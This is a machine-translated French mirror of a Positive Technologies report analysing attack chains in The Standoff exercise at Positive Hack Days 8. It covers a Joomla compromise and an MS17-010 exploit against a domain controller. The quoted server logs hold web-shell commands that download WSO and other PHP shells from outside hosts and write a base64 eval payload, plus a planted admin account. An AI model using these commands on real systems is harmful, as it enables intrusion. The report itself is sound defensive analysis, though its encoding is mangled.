<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üññüèΩ üì≤ ü¶Ñ Confrontation √† Positive Hack Days 8: analyse des cha√Ænes d'attaque ü¶ó ‚¨õÔ∏è üëºüèæ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Ainsi, la prochaine ¬´confrontation¬ª s'est termin√©e lors du Positive Hack Days 8. Cette fois, plus d'une centaine de personnes ont particip√© au combat:...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Confrontation √† Positive Hack Days 8: analyse des cha√Ænes d'attaque</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/418335/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><img src="https://habrastorage.org/webt/lv/ma/od/lvmaodafe3q0xv0wflk--q_xae4.png"></a> <br><br>  Ainsi, la prochaine ¬´confrontation¬ª s'est termin√©e lors du Positive Hack Days 8. Cette fois, plus d'une centaine de personnes ont particip√© au combat: 12 √©quipes d'attaquants, 8 √©quipes de d√©fenseurs et toute une ville qu'ils ont d√ª attaquer et d√©fendre. <a name="habracut"></a><br><br>  Cette fois, The Standoff a √©t√© suivi non seulement par des √©quipes d'attaquants et de d√©fenseurs, les trois produits de notre soci√©t√© ont regard√© tout ce qui s'est pass√© sur le r√©seau de jeux: <br><br><ul><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">MaxPatrol SIEM</a></b> - syst√®me SIEM. </li><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">PT Network Attack Discovery</a></b> est une solution de s√©curit√© r√©seau pour analyser le trafic r√©seau, identifier et enqu√™ter sur les incidents. </li><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">PT MultiScanner</a></b> est un syst√®me √† plusieurs niveaux pour d√©tecter et bloquer le contenu malveillant. </li></ul><br>  Les trois produits ont √©t√© surveill√©s par l'√©quipe du centre expert en s√©curit√© Positive Technologies (PT ESC), qui surveille les tendances et les √©v√©nements du jeu pour en informer les visiteurs du centre expert. <br><br>  C'√©tait la premi√®re participation d'une telle √©quipe d'experts et de produits et ils ont montr√© leur meilleur c√¥t√©: il y avait tellement de donn√©es qui seraient suffisantes pour un √©norme rapport.  Les r√©seaux du bureau n ¬∞ 2 de la soci√©t√© int√©gratrice SPUTNIK et du bureau n ¬∞ 1 de la compagnie d'assurance BeHealthy se sont av√©r√©s les plus int√©ressants et les plus complets par description.  Le bureau n ¬∞ 2 √©tait int√©ressant en ce qu'il √©tait sous la supervision du SOC RTK, mais n'√©tait pas pris en charge par une √©quipe de d√©fenseurs et il √©tait compl√®tement pirat√© par les √©quipes attaquantes. <br><br>  Permettez-moi de vous rappeler qu'en plus de deux bureaux, la ville disposait d'une centrale et d'une sous-station de chauffage et d'√©lectricit√©, de chemins de fer, de maisons intelligentes avec r√©cup√©ration d'√©nergie et de banques avec des distributeurs automatiques de billets. <br><br><img src="https://habrastorage.org/webt/ki/99/iq/ki99iqb0x5sdfk5d_am3faotusu.png"><br><br>  <i>Infrastructure de jeu</i> <br><br>  La fa√ßon dont les √©v√©nements dans les bureaux # 1 et # 2 ont regard√© √† travers le prisme de MaxPatrol SIEM, PT NAD et PT MultiScanner en mettant l'accent sur les d√©tails techniques du piratage sera discut√©e plus loin. <br><br>  Diagramme logique d'un bureau de r√©seau de jeux n ¬∞ 2: <br><br><img src="https://habrastorage.org/webt/m4/fw/um/m4fwumpq3cljrqs-6r1qjh5kp5q.png"><br><br>  L'adresse des √©quipes attaquantes est 172.31.x.0 / 24, o√π x est le num√©ro de commande de 1 √† 8. En fait, il y avait 12 √©quipes au total, mais en raison de l'architecture de l'infrastructure r√©seau du r√©seau (le c≈ìur du r√©seau a √©t√© √©mul√© dans Cisco CSR1000v) et du physique √©quipements, il a √©t√© possible d'organiser seulement 8 interfaces r√©seau physiques qui ont √©t√© commut√©es pour les √©quipes dans toute la zone de jeu.  Par cons√©quent, dans quatre r√©seaux, deux √©quipes √©taient localis√©es. <br><br>  Dans l'infrastructure d'Office # 2, quatre segments de r√©seau ont √©t√© allou√©s: <br><br><ul><li>  DMZ (100,64,154,0/25); </li><li>  serveurs (10.106.60.0/24); </li><li>  Employ√©s de l'entreprise (10.106.50.0/24); </li><li>  √©quipe de d√©fenseurs (10.106.82.0/24). </li></ul><br>  Les n≈ìuds situ√©s dans la zone d√©militaris√©e √©taient accessibles sur le r√©seau pour tous les attaquants.  Lors de l'acc√®s √† ces n≈ìuds, les adresses r√©seau r√©elles des commandes NAT provenaient du pool 100.110.255.0/24, donc pour les d√©fenseurs, il n'√©tait pas facile de d√©terminer √† qui appartient tel ou tel trafic r√©seau - cela pourrait √™tre l'une des 12 √©quipes attaquantes ou un v√©rificateur de script l√©gitime, v√©rifier la facilit√© de service des services √† partir du m√™me pool d'adresses que les attaquants. <br><br>  Pour remplir nos produits d'√©v√©nements sur ce qui se passe dans l'infrastructure de jeu, nous avons organis√© la suppression et la redirection d'une copie de tout le trafic r√©seau dans PT NAD, ainsi que mis en place un audit approfondi des √©v√©nements des syst√®mes cibles et organis√© leur livraison √† MaxPatrol SIEM. <br><br>  L'analyse des attaques mettant l'accent sur les √©quipes se trouve dans notre autre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">rapport sur Habr</a> . <br><br><h2>  Joomla (100.64.154.147) </h2><br>  L'un des serveurs du bureau DMZ # 2 √©tait un serveur avec Joomla CMS.  Quelques heures apr√®s le d√©but du jeu, les premiers signes de compromis de ce serveur sont apparus dans PT NAD - remplissage webshell √† partir du pool d'adresses IP ¬´grises¬ª: <br><br><img src="https://habrastorage.org/webt/pj/jq/fr/pjjqfrt_2jdv_fwplypyzlmhwcg.png"><br><br>  Comme mentionn√©, tous les sous-r√©seaux des √©quipes attaquantes ont √©t√© arr√™t√©s sur le m√™me ME (Attacker-FW) et lors de la cr√©ation d'une connexion aux objets attaqu√©s, les adresses IP des attaquants ont √©t√© traduites en adresses IP grises √† partir d'un seul pool (100.110.255.0/24).  Par cons√©quent, pour la personnification des attaques par commandes, un sch√©ma a √©t√© impl√©ment√© avec l'enrichissement des passerelles selon le tableau NAT de ce ME.  Dans le cadre de MP SIEM, l'enrichissement a √©t√© le suivant: <br><br><img src="https://habrastorage.org/webt/bk/4d/7s/bk4d7szltcyuzoywpodadcszg3c.png"><br><br>  Cette approche nous a permis de d√©terminer que cette attaque avait √©t√© initi√©e par l'√©quipe n ¬∞ 1.  Cependant, en raison de l'utilisation du m√™me pool d'adresses par diff√©rentes √©quipes, nous ne pouvons pas d√©terminer de mani√®re fiable le nom de l'√©quipe √† la demande d'un r√©seau particulier, et √† des fins de narration, nous nommerons les √©quipes par leur num√©ro de r√©seau. <br><br>  Une heure apr√®s avoir essay√© la commande n ¬∞ 1, PT NAD a remarqu√© que la commande n ¬∞ 8 se chargeait sur un autre shell web avec le nom parlant SHE __. La commande d√©finit une session ssh √† partir d'un utilisateur utilisateur non privil√©gi√©. <br><br><img src="https://habrastorage.org/webt/xp/zp/6h/xpzp6hvlbykhamirlmbhoxm2lm0.png"><br><br><img src="https://habrastorage.org/webt/bd/cc/mx/bdccmxlsasdvx5avlabnoxqgm44.png"><br><br>  Le mot de passe de ce compte √©tait en haut du dictionnaire rockyou et √©tait assorti.  L'acc√®s au compte root pour la 8e √©quipe n'est apparu qu'√† environ 16 h 00 en raison de l'appartenance de l'utilisateur au groupe avec le droit d'ex√©cuter des commandes sans mot de passe √† partir de la racine.  Nous pouvons en √™tre convaincus dans les journaux MP SIEM, qui nous parlent de la premi√®re connexion en tant qu'utilisateur utilisateur, puis de l'escalade de privil√®ges avec la commande sudo. <br><br><img src="https://habrastorage.org/webt/s4/jz/2m/s4jz2m3zuf1mirhsdhjrdfu9ug8.png"><br><img src="https://habrastorage.org/webt/nl/wq/la/nlwqlabrbzuu3vnjrtzbuo0qaro.png"><br><br>  La dur√©e du journal peut varier de 3 heures en raison de la configuration du serveur de jeu. <br><br>  Au soir du premier jour de l'affrontement, la sixi√®me √©quipe a pris possession de Joomla.  NAD a d√©couvert l'exploitation d'une vuln√©rabilit√©, ou plut√¥t d'une <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">fonctionnalit√©</a> par laquelle l'√©quipe a t√©l√©charg√© le shell Web WSO largement connu et a commenc√© √† interagir avec. <br><br><img src="https://habrastorage.org/webt/ts/il/um/tsilumlbi-mfrbehbf8vo1dcjfo.png"><br><br><pre><code class="hljs powershell"><span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">31</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">35</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">35</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.220</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">56</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP ‚Ä¶ <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.32</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.118</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">43</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.145</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">49</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP</code> </pre> <br>  Il est √† noter que le script utilis√© par les commandes pour remplir les shells, <br>  n√©cessite un compte administrateur, dont le mot de passe a √©t√© s√©lectionn√© √† l'aide d'une autre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">vuln√©rabilit√©</a> CVE-2017-14596 dans le m√©canisme d'authentification dans Joomla via LDAP: en modifiant la demande d'authentification LDAP, les attaquants r√©cup√®rent rapidement l'identifiant et le mot de passe du compte administrateur. <br><br>  Et apr√®s une demi-heure, ils ont pris le contr√¥le de l'ensemble du syst√®me. <br><br><img src="https://habrastorage.org/webt/0f/mb/kh/0fmbkhezemjgbqpk33mmdrypg70.png"><br><br>  Les √©quipes attaquantes ont utilis√© la machine captur√©e pour de nouvelles reconnaissances dans le r√©seau du deuxi√®me bureau SPUTNIK avec les utilitaires nmap et hping3.  On peut se faire une id√©e de leurs actions √† partir des donn√©es MP SIEM: <br><br><img src="https://habrastorage.org/webt/tb/o2/lz/tbo2lzwokr5rloy_7ykz8klyywg.png"><br><img src="https://habrastorage.org/webt/vn/nr/o4/vnnro4qzj6jwsw8snzzpmfpu8gy.png"><br><br>  Exemple de r√©seau DMZ Intelligence Office 2 (100.64.154.0/24) et du r√©seau de l'√©quipe de d√©fense (10.106.82.0/24): <br><br><img src="https://habrastorage.org/webt/ne/bu/dr/nebudriyumef2zbdsigm2ncyqqm.png"><br><img src="https://habrastorage.org/webt/tv/6u/ay/tv6uaynn7krj_ls6snexal-nu3g.png"><br><br>  √Ä 21h17, nous avons constat√© que le client OpenVPN √©tait install√© et lanc√© sur le serveur Joomla.  La connexion a √©t√© √©tablie avec le serveur 195.16.61.229, situ√© √† Moscou.  Un peu plus tard, nous avons d√©couvert que ces actions √©taient effectu√©es par des membres de l'√©quipe # 6 et ainsi l'√©quipe a r√©ussi √† attirer des ressources informatiques et humaines suppl√©mentaires situ√©es sur un site distant. <br><br>  Toutes les interactions avec le site distant ont √©t√© r√©alis√©es √† l'int√©rieur du tunnel prot√©g√©, il est donc impossible d'√©tablir la nature de cette interaction et le degr√© de son influence sur le jeu.  Nous ne pouvons que tirer des conclusions indirectes, bas√©es sur le nombre de sessions VPN et la quantit√© de donn√©es transf√©r√©es. <br><br><img src="https://habrastorage.org/webt/iw/ce/c4/iwcec4-s1rj715wnjapvtqgivza.png"><br><br>  Mais le plus int√©ressant est que l'√©quipe n'a pas nettoy√© les traces - apr√®s le jeu, nous avons trouv√© sur le serveur ovpn une configuration contenant la racine et les certificats personnels, la cl√© priv√©e et les donn√©es personnelles du propri√©taire de la cl√©.  Si vous utilisez un moteur de recherche, il n'est pas du tout difficile de d√©terminer la v√©ritable identit√© du propri√©taire sous le pseudo phonexicum.  La carte compl√®te avec toutes les connexions VPN pendant le jeu peut √™tre consult√©e √† la fin de l'article. <br><br>  D'autres √©v√©nements int√©ressants ont commenc√© √† se d√©velopper apr√®s minuit (+3 heures pour les journaux). <br>  La commande Shell /id.php # 4 trouve la commande # 1: <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">58</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php HTTP/1.1 [15/May/2018:21:58:24 +0000] "</span></span>GET /id.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">58</span></span>:<span class="hljs-number"><span class="hljs-number">34</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?c=ls HTTP/1.1 [15/May/2018:21:58:38 +0000] "</span></span>GET /id.php?cmd=ls HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">59</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=id HTTP/1.1 [15/May/2018:21:59:56 +0000] "</span></span>GET /id.php?cmd=ls+<span class="hljs-literal"><span class="hljs-literal">-la</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/bb/1j/z7/bb1jz7fidnpbep9o-lxcqmdwoou.png"><br><img src="https://habrastorage.org/webt/4u/or/jj/4uorjjrsmjk1kzlautfduvh8gtq.png"><br><br>  Et se renforce imm√©diatement dans le syst√®me, pr√©servant le shell Web WSO sous le nom 123.php <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">05</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=wget HTTP/1.1 [15/May/2018:22:00:10 +0000] "</span></span>GET /id.php?cmd=wget <span class="hljs-literal"><span class="hljs-literal">-h</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=cat index.php HTTP/1.1 [15/May/2018:22:01:04 +0000] "</span></span>GET /id.php?cmd=wget http://txt.<span class="hljs-number"><span class="hljs-number">731</span></span>my.com/wso.txt <span class="hljs-literal"><span class="hljs-literal">-o</span></span> <span class="hljs-number"><span class="hljs-number">123</span></span>.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/uu/yf/sb/uuyfsboyntyyavtzwwh4diilju8.png"><br><img src="https://habrastorage.org/webt/1i/rb/7f/1irb7fdixxk8cdoblvtn7hkldlm.png"><br><br>  La premi√®re √©quipe a h√©berg√© jusqu'√† ce que l'√©quipe # 4 le d√©couvre quelques heures plus tard et, apr√®s une courte discussion, renomme le shell id.php en 021371b392f0b42398630fd668adff5d.php <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">13</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=id HTTP/1.1 [16/May/2018:00:06:26 +0000] "</span></span>GET /id.php?cmd=ls HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">07</span></span>:<span class="hljs-number"><span class="hljs-number">16</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=mv id.php 021371b392f0b42398630fd668adff5d.php HTTP/1.1</span></span></code> </pre><br>  Par la suite, 021371b392f0b42398630fd668adff5d.php a √©t√© remplac√© par kekekeke.php et kekpek.php <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> (base64_decode (ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr ( <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> &gt; Kekekeke.php HTTP <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/rx/ei/zf/rxeizfxenzfe2cxwf1xuuc8bwzk.png"><br><br>  Les √©v√©nements suivants dans l'infrastructure de domaine du bureau # 2 SPUTNIK sont √©troitement li√©s √† ce qui se passe sur Jumla. <br><br><h2>  SPUTNIK (10.106.60.0/24) </h2><br>  Apr√®s que Joomla a √©t√© perc√©, l'attaquant a eu acc√®s aux segments internes de l'infrastructure SPUTNIK (Office # 2).  Sans r√©fl√©chir √† deux fois, l'exploit MS17-010 vole vers le contr√¥leur de domaine WIN2008R2-DC.domain2.phd (10.106.60.10). <br><br><img src="https://habrastorage.org/webt/ok/iw/xo/okiwxohg5xsajx_kpbq3muhbwss.png"><br><br>  Il est plus pratique d'observer la chronologie d'autres √©v√©nements par les d√©clencheurs de MP SIEM: <br><br><img src="https://habrastorage.org/webt/pe/b3/dc/peb3dct4qumtok5vppa_awaxxgg.png"><br><img src="https://habrastorage.org/webt/ad/vn/ul/advnuld4auuorgtjbnxb3h3itxy.png"><br><br>  La premi√®re √©tape de l'attaquant a √©t√© de cr√©er un utilisateur avec le nom "nom d'utilisateur" et le mot de passe "1qazzaq!"  et l'ajouter au groupe d'administrateurs locaux (√©cran n ¬∞ 2).  L'exploitation r√©ussie des exploits de MS17-010 donne acc√®s avec les privil√®ges NT-Authority \ System et dans les journaux Windows, cet acc√®s est affich√© sous la forme win2008r2-dc $. <br><br><img src="https://habrastorage.org/webt/xb/p7/hv/xbp7hvoec-1pl8spi8mso-hj-qo.png"><br><img 